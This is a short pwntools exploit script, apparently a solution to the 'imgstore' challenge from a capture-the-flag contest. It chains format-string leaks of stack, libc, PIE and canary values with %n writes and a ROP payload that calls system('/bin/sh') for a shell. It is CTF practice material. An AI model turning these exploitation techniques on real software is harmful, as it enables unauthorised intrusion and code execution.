from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './imgstore'
HOST = 'imgstore.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-linux-x86-64.so.2', TARGET])
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x1e14])

# fsb offset: 8

# grab leaks
r.sendlineafter(b'>> ', b'3')
r.sendlineafter(b': ', b'|%p|%25$p|%23$p|%21$p|')
r.recvuntil(b'|')

stack = int(r.recvuntil(b'|', True), 16)
target = stack + 0x26a8

leak = int(r.recvuntil(b'|', True), 16)
base = leak -0x24083
system = base + 0x52290
rdi = base + 0x0019788d
binsh  = base + 0x1b45bd

leak = int(r.recvuntil(b'|', True), 16)
pie = leak - 0x22a3
feedbeef = pie + 0x6050

canary = int(r.recvuntil(b'|', True), 16)

# set backdoor conditions
r.sendlineafter(b']: ', b'y')
payload = b'%9$naaaa'
payload += p64(feedbeef)
r.sendlineafter(b': ', payload)

r.sendlineafter(b']: ', b'y')
payload = b'%9$naaaa'
payload += p64(target)
r.sendlineafter(b': ', payload)

# send ROP payload to backdoor
payload = b''
payload += b'a'*0x68
payload += p64(canary)
payload += b'c'*8
payload += flat(rdi+1, rdi, binsh, system)
r.sendlineafter(b'\n>', payload)

r.interactive()
r.close()

